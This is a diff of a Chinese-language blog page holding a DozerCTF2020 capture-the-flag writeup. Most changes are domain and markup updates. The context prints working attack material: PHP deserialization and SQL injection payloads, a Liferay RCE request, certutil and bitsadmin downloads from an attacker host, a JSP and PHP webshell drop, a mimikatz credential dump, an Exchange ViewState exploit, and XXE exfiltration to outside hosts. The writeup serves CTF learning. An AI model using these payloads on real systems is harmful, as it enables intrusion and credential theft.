@@ -8,17 +8,17 @@
         <title>DozerCTF2020 Writeup - Leon&#39;s Blog</title><meta name="Description" content="Leon&#39;s Blog-Keep learning web security"><meta property="og:title" content="DozerCTF2020 Writeup" />
 <meta property="og:description" content="这个比赛赛题质量都很高，且偏向实战多一点，上来就是域渗透属实令人肾透，xxe打ssrf最后差一点做出来比较可惜" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://clq0.top/dozerctf2020-writeup/" />
-<meta property="og:image" content="https://clq0.top/logo_.jpg"/>
+<meta property="og:url" content="https://blog.h4ck.fun/dozerctf2020-writeup/" /><meta property="og:image" content="https://blog.h4ck.fun/logo_.jpg"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-06-15T20:24:46+08:00" />
 <meta property="article:modified_time" content="2020-06-15T20:24:46+08:00" />
+
 <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://clq0.top/logo_.jpg"/>
+<meta name="twitter:image" content="https://blog.h4ck.fun/logo_.jpg"/>
 
 <meta name="twitter:title" content="DozerCTF2020 Writeup"/>
 <meta name="twitter:description" content="这个比赛赛题质量都很高，且偏向实战多一点，上来就是域渗透属实令人肾透，xxe打ssrf最后差一点做出来比较可惜"/>
 <meta name="application-name" content="Leon&#39;s Blog">
-<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://clq0.top/dozerctf2020-writeup/" /><link rel="prev" href="https://clq0.top/php-create_function/" /><link rel="next" href="https://clq0.top/%E4%B8%AD%E8%AE%A1%E9%87%8F%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%A4%A7%E5%AD%A6%E7%94%9Fctf%E7%AB%9E%E8%B5%9B-writeup/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.h4ck.fun/dozerctf2020-writeup/" /><link rel="prev" href="https://blog.h4ck.fun/php-create_function/" /><link rel="next" href="https://blog.h4ck.fun/%E4%B8%AD%E8%AE%A1%E9%87%8F%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%A4%A7%E5%AD%A6%E7%94%9Fctf%E7%AB%9E%E8%B5%9B-writeup/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -26,11 +26,11 @@
         "inLanguage": "zh-CN",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "https:\/\/clq0.top\/dozerctf2020-writeup\/"
+            "@id": "https:\/\/blog.h4ck.fun\/dozerctf2020-writeup\/"
         },"genre": "posts","keywords": "域渗透, SSRF, XXE, RCE, SQL注入","wordcount":  5778 ,
-        "url": "https:\/\/clq0.top\/dozerctf2020-writeup\/","datePublished": "2020-06-15T20:24:46+08:00","dateModified": "2020-06-15T20:24:46+08:00","publisher": {
+        "url": "https:\/\/blog.h4ck.fun\/dozerctf2020-writeup\/","datePublished": "2020-06-15T20:24:46+08:00","dateModified": "2020-06-15T20:24:46+08:00","publisher": {
             "@type": "Organization",
-            "name": "Leon","logo": "https:\/\/clq0.top\/logo_.jpg"},"author": {
+            "name": "Leon","logo": "https:\/\/blog.h4ck.fun\/logo_.jpg"},"author": {
                 "@type": "Person",
                 "name": "Leon"
             },"description": ""
@@ -161,7 +161,7 @@ base64解码后：
 源码：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -215,7 +215,7 @@ base64解码后：
 </span><span class="lnt">52
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 
 <span class="k">class</span> <span class="nc">home</span>
 <span class="p">{</span>
@@ -266,13 +266,13 @@ base64解码后：
     <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
 
 <span class="p">}</span>
-<span class="cp">?&gt;</span>
-</code></pre></td></tr></table>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
 </div>
 </div><p>poc：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -322,7 +322,7 @@ base64解码后：
 </span><span class="lnt">48
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="c1">//poc
 </span><span class="c1"></span><span class="k">class</span> <span class="nc">home</span>
 <span class="p">{</span>
@@ -369,8 +369,8 @@ base64解码后：
 <span class="nv">$a</span> <span class="o">=</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$poc</span><span class="p">));</span>
 <span class="nx">print_r</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
 <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
-<span class="cp">?&gt;</span> 
-</code></pre></td></tr></table>
+<span class="cp">?&gt;</span><span class="err"> 
+</span></code></pre></td></tr></table>
 </div>
 </div><p>payload:</p>
 <p><code>?path=O%3A4%3A%22home%22%3A2%3A%7Bs%3A12%3A%22%00home%00method%22%3Bs%3A5%3A%22mysys%22%3Bs%3A10%3A%22%00home%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22flag.php%22%3B%7D%7D</code></p>
@@ -378,7 +378,7 @@ base64解码后：
 <p>base64：<code>&lt;?php $flag = 'flag{j4nc920fm8b2z0r2mc7dsf87s6785a675sa776vd}';?&gt;</code></p>
 <h1 id="sqli-labs-0">sqli-labs 0</h1>
 <p>根据hint将接下来sql注入的语句全部用url二次编码就行
-id=1&rsquo; # 单引号注入，select被过滤，根据经验直接堆叠
+id=1' # 单引号注入，select被过滤，根据经验直接堆叠
 <code>1';show databases;#</code>
 <code>1';show tables;#</code>
 <code>1';show columns from </code>uziuzi<code>;#</code>
@@ -421,7 +421,7 @@ Liferay Portal 7.2.X</p>
 <p>LifExp.java文件：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -434,7 +434,7 @@ Liferay Portal 7.2.X</p>
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">LifExp</span> <span class="o">{</span> 
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">LifExp</span> <span class="o">{</span> 
     <span class="kd">static</span> <span class="o">{</span> 
         <span class="k">try</span> <span class="o">{</span> 
             <span class="n">String</span><span class="o">[]</span> <span class="n">cmd</span> <span class="o">=</span> <span class="o">{</span><span class="s">&#34;cmd.exe&#34;</span><span class="o">,</span> <span class="s">&#34;/c&#34;</span><span class="o">,</span> <span class="s">&#34;calc.exe&#34;</span><span class="o">};</span>
@@ -465,7 +465,7 @@ Liferay Portal 7.2.X</p>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -474,7 +474,7 @@ Liferay Portal 7.2.X</p>
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-text" data-lang="text">POST /api/jsonws/invoke HTTP/1.1
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">POST /api/jsonws/invoke HTTP/1.1
 Host: 127.0.0.1:8080
 Content-Length: 1349
 Content-Type: application/x-www-form-urlencoded
@@ -501,10 +501,10 @@ cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&amp;p_auth=o3lt8q1F&amp;f
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bat" data-lang="bat">certutil.exe -urlcache -split -f <span class="s2">&#34;http://ip:8500/leon.txt“ leon.txt</span>
+<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat">certutil.exe -urlcache -split -f <span class="s2">&#34;http://ip:8500/leon.txt“ leon.txt</span>
 </code></pre></td></tr></table>
 </div>
 </div><p><img
@@ -517,10 +517,10 @@ cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&amp;p_auth=o3lt8q1F&amp;f
         title="https://gitee.com/leonsec/images/raw/master/QQ图片20200615102916.png" /></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bat" data-lang="bat">bitsadmin /rawreturn /transfer down &#39;http://ip:8500/leon.txt&#39; D:\leon.txt
+<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat">bitsadmin /rawreturn /transfer down &#39;http://ip:8500/leon.txt&#39; D:\leon.txt
 </code></pre></td></tr></table>
 </div>
 </div><p>都可以成功远程下载文件</p>
@@ -529,10 +529,10 @@ cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&amp;p_auth=o3lt8q1F&amp;f
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bat" data-lang="bat">String[] cmd = {<span class="s2">&#34;cmd.exe&#34;</span>, <span class="s2">&#34;/c&#34;</span>, <span class="s2">&#34;certutil.exe -urlcache -split -f&#34;</span>, <span class="s2">&#34;http://ip:8500/cmdcmd.jsp&#34;</span>, <span class="s2">&#34;..\\webapps\\ROOT\\cmdcmd.jsp&#34;</span>};
+<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat">String[] cmd = {<span class="s2">&#34;cmd.exe&#34;</span>, <span class="s2">&#34;/c&#34;</span>, <span class="s2">&#34;certutil.exe -urlcache -split -f&#34;</span>, <span class="s2">&#34;http://ip:8500/cmdcmd.jsp&#34;</span>, <span class="s2">&#34;..\\webapps\\ROOT\\cmdcmd.jsp&#34;</span>};
 </code></pre></td></tr></table>
 </div>
 </div><p>cmdcmd.jsp是webshell，经过本地测试执行命令的当前路径在<code>liferay-ce-portal-7.2.0-ga1\tomcat-9.0.17\bin</code>
@@ -576,7 +576,7 @@ cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&amp;p_auth=o3lt8q1F&amp;f
 <code>ipconfig /all</code>:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -645,7 +645,7 @@ cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&amp;p_auth=o3lt8q1F&amp;f
 </span><span class="lnt">67
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-text" data-lang="text">C:\Users\root&gt;ipconfig /all
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">C:\Users\root&gt;ipconfig /all
 
 Windows IP ����
 
@@ -766,7 +766,7 @@ Windows IP ����
 然后执行：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -863,7 +863,7 @@ Windows IP ����
 </span><span class="lnt">95
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bat" data-lang="bat">mimikatz # sekurlsa::minidump lsass.dmp
+<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat">mimikatz # sekurlsa::minidump lsass.dmp
 Switch to MINIDUMP : &#39;lsass.dmp&#39;
 
 mimikatz # sekurlsa::logonPasswords full
@@ -970,7 +970,7 @@ SID               : S-1-5-21-341825-3789073605-4250195040-1109
 <p>根据提示和拿到的域信息，找到<code>EXCHANGE SERVERS</code>组：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -987,7 +987,7 @@ SID               : S-1-5-21-341825-3789073605-4250195040-1109
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-text" data-lang="text">cn: DOZER-EXCHANGE
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">cn: DOZER-EXCHANGE
 distinguishedName: CN=DOZER-EXCHANGE,CN=Computers,DC=dozer,DC=org
 instanceType: 4
 whenCreated: 05/13/2020 15:06:52
@@ -1029,7 +1029,7 @@ userAccountControl: 4096
 <p>我们需要四个参数：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1038,7 +1038,7 @@ userAccountControl: 4096
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-text" data-lang="text">–validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默认，漏洞产生原因）
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">–validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默认，漏洞产生原因）
 
 –validationalg = SHA1（默认，漏洞产生原因）
 
@@ -1073,10 +1073,10 @@ viewstateuserkey位于：<code>default.aspx–&gt;Headers–&gt;ASP.NET_SessionI
 <p>使用<code>ysoserial.exe</code>生成序列化<code>payload</code>：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bat" data-lang="bat">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c <span class="s2">&#34;cmd.exe /c certutil.exe -urlcache -split -f http://ip/test.exe&#34;</span> --validationalg=<span class="s2">&#34;SHA1&#34;</span> --validationkey=<span class="s2">&#34;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&#34;</span> --generator=<span class="s2">&#34;B97B4E27&#34;</span> --viewstateuserkey=<span class="s2">&#34;247061cc-fb54-4d4e-bb66-233ffc8e3848&#34;</span> --isdebug -islegacy
+<pre tabindex="0" class="chroma"><code class="language-bat" data-lang="bat">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c <span class="s2">&#34;cmd.exe /c certutil.exe -urlcache -split -f http://ip/test.exe&#34;</span> --validationalg=<span class="s2">&#34;SHA1&#34;</span> --validationkey=<span class="s2">&#34;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&#34;</span> --generator=<span class="s2">&#34;B97B4E27&#34;</span> --viewstateuserkey=<span class="s2">&#34;247061cc-fb54-4d4e-bb66-233ffc8e3848&#34;</span> --isdebug -islegacy
 </code></pre></td></tr></table>
 </div>
 </div><h3 id="获得shell">获得shell</h3>
@@ -1084,11 +1084,11 @@ viewstateuserkey位于：<code>default.aspx–&gt;Headers–&gt;ASP.NET_SessionI
 <code>payload</code>:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-text" data-lang="text">https://ip/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&amp;__VIEWSTAT
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">https://ip/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&amp;__VIEWSTAT
 E=&lt;ViewState&gt;
 </code></pre></td></tr></table>
 </div>
@@ -1116,7 +1116,7 @@ E=&lt;ViewState&gt;
 <code>xxx.svg</code>:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1128,7 +1128,7 @@ E=&lt;ViewState&gt;
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
 <span class="cp">&lt;!DOCTYPE note [
 </span><span class="cp">&lt;!ENTITY % int SYSTEM &#34;http://ip:8500/a.xml&#34;&gt;</span>
 %int;
@@ -1143,12 +1143,12 @@ E=&lt;ViewState&gt;
 </div><p><code>a.xml</code>:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/home/r1ck/.bash_history&#34;&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/home/r1ck/.bash_history&#34;&gt;</span>
 
 <span class="cp">&lt;!ENTITY % all &#34;&lt;!ENTITY % send SYSTEM &#39;http://ip:8500/?%file;&#39;&gt;</span>&#34;&gt;
 </code></pre></td></tr></table>
@@ -1164,23 +1164,23 @@ E=&lt;ViewState&gt;
         title="https://gitee.com/leonsec/images/raw/master/QQ图片20200617150330.png" /></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /app
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /app
 php -S 0.0.0.0:8080
 </code></pre></td></tr></table>
 </div>
 </div><p>可以看到在8080端口有web服务，由于靶机是内网穿透出来的，所以我们不能直接访问到8080端口，只能利用xxe打ssrf</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/&#34;&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/&#34;&gt;</span>
 
 <span class="cp">&lt;!ENTITY % all &#34;&lt;!ENTITY % send SYSTEM &#39;http://59.110.157.4:8500/?%file;&#39;&gt;</span>&#34;&gt;
 </code></pre></td></tr></table>
@@ -1188,7 +1188,7 @@ php -S 0.0.0.0:8080
 </div><p>得到：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1208,7 +1208,7 @@ php -S 0.0.0.0:8080
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-text" data-lang="text">&lt;!doctype html&gt;
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">&lt;!doctype html&gt;
 &lt;html&gt;
 &lt;head&gt;
 &lt;meta charset=&#34;UTF-8&#34;&gt;
@@ -1232,12 +1232,12 @@ Array
 要进行url编码</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/?id=1%27%20union%20select%201,%27%3c?php%20system($%5fGET%5bcmd%5d)%3b?%3e%27%20into%20outfile%27/app/leon.php%27%23&#34;&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/?id=1%27%20union%20select%201,%27%3c?php%20system($%5fGET%5bcmd%5d)%3b?%3e%27%20into%20outfile%27/app/leon.php%27%23&#34;&gt;</span>
 
 <span class="cp">&lt;!ENTITY % all &#34;&lt;!ENTITY % send SYSTEM &#39;http://ip:8500/?%file;&#39;&gt;</span>&#34;&gt;
 </code></pre></td></tr></table>
@@ -1245,12 +1245,12 @@ Array
 </div><p>shell语句部分也可以进行hex编码：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/?id=1%27%20union%20select%201,0x3c3f7068702073797374656d28245f4745545b636d645d293b3f3e%20into%20outfile%27/app/leon.php%27%23&#34;&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/?id=1%27%20union%20select%201,0x3c3f7068702073797374656d28245f4745545b636d645d293b3f3e%20into%20outfile%27/app/leon.php%27%23&#34;&gt;</span>
 
 <span class="cp">&lt;!ENTITY % all &#34;&lt;!ENTITY % send SYSTEM &#39;http://ip:8500/?%file;&#39;&gt;</span>&#34;&gt;
 </code></pre></td></tr></table>
@@ -1258,12 +1258,12 @@ Array
 </div><p>写进去后直接利用即可：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/leon.php?cmd=ls&#34;&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/leon.php?cmd=ls&#34;&gt;</span>
 
 <span class="cp">&lt;!ENTITY % all &#34;&lt;!ENTITY % send SYSTEM &#39;http://ip:8500/?%file;&#39;&gt;</span>&#34;&gt;
 </code></pre></td></tr></table>
@@ -1279,7 +1279,7 @@ Array
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://clq0.top/dozerctf2020-writeup/" data-title="DozerCTF2020 Writeup" data-hashtags="域渗透,SSRF,XXE,RCE,SQL注入"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://clq0.top/dozerctf2020-writeup/" data-hashtag="域渗透"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://clq0.top/dozerctf2020-writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://clq0.top/dozerctf2020-writeup/" data-title="DozerCTF2020 Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.h4ck.fun/dozerctf2020-writeup/" data-title="DozerCTF2020 Writeup" data-via="Le0nsec" data-hashtags="域渗透,SSRF,XXE,RCE,SQL注入"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.h4ck.fun/dozerctf2020-writeup/" data-hashtag="域渗透"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.h4ck.fun/dozerctf2020-writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://blog.h4ck.fun/dozerctf2020-writeup/" data-title="DozerCTF2020 Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
             </div>
         </div>
     </div>
@@ -1298,7 +1298,7 @@ Array
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><a>本网站由</a><a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="-blank"><img src="/upyun_logo2.png" width="4%" style="vertical-align:middle"></a><a>提供CDN加速/云存储服务</a></div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                     <span class="icp"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278765080&web_id=1278765080"></script></span></div>
         </div>
     </footer></div>
